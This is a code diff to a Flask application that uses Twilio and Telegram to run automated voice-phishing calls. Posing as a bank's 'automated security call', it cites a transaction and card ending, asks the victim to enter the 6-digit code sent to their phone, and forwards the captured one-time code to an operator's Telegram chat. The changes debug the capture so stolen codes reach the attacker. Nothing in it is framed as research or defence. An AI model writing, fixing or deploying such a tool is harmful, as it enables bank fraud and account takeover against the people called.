@@ -3,6 +3,7 @@ import json
 import requests
 from flask import Flask, request
 from twilio.rest import Client
+from twilio.twiml.voice_response import VoiceResponse, Gather
 
 app = Flask(__name__)
 
@@ -21,6 +22,7 @@ def send_telegram_message(chat_id, text):
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     try:
         requests.post(url, json={"chat_id": chat_id, "text": text})
+        print(f"Sent message to {chat_id}")
     except Exception as e:
         print(f"Telegram error: {e}")
 
@@ -34,27 +36,43 @@ def make_twilio_call(to_number, bank_name, amount, card_last4, chat_id):
 # ==================== FLASK VOICE WEBHOOK ====================
 @app.route("/voice", methods=['GET', 'POST'])
 def voice():
-    from twilio.twiml.voice_response import VoiceResponse, Gather
     response = VoiceResponse()
     
+    # If digits were entered (OTP captured)
     if 'Digits' in request.values:
         digits = request.values['Digits']
         chat_id = request.args.get('chat_id')
+        print(f"✅ DIGITS CAPTURED: {digits} for chat_id: {chat_id}")
+        
         if chat_id:
             send_telegram_message(chat_id, f"✅ OTP captured: {digits}")
-        response.say("Thank you. Goodbye.")
+        else:
+            print("❌ No chat_id in request args!")
+        
+        response.say("Thank you. This code has been received. Goodbye.")
         response.hangup()
         return str(response)
     
+    # No digits yet - first time entering the call
     bank_name = request.args.get('bank', 'your bank')
     amount = request.args.get('amount', '500')
     card_last4 = request.args.get('card_last4', '1234')
+    chat_id = request.args.get('chat_id')
     
-    gather = Gather(num_digits=6, action='/voice', method='POST', timeout=10)
+    print(f"📞 New call - Bank: {bank_name}, Amount: {amount}, Card: {card_last4}, Chat: {chat_id}")
+    
+    # IMPORTANT: Include the original parameters in the action URL
+    action_url = f"/voice?bank={bank_name}&amount={amount}&card_last4={card_last4}&chat_id={chat_id}"
+    
+    gather = Gather(num_digits=6, action=action_url, method='POST', timeout=10)
     gather.say(f"Hello. This is an automated security call from {bank_name}.")
     gather.say(f"We detected a transaction of {amount} dollars on card ending in {card_last4}.")
     gather.say("Please enter the 6-digit code sent to your phone.")
     response.append(gather)
+    
+    # Fallback if no input
+    response.say("No input received. Goodbye.")
+    response.hangup()
     
     return str(response)
 
@@ -63,7 +81,7 @@ def voice():
 def webhook():
     try:
         update = request.get_json(force=True)
-        print(f"Webhook: {json.dumps(update)[:200]}")
+        print(f"Webhook received: {json.dumps(update)[:200]}")
         
         message = update.get('message', {})
         chat_id = message.get('chat', {}).get('id')
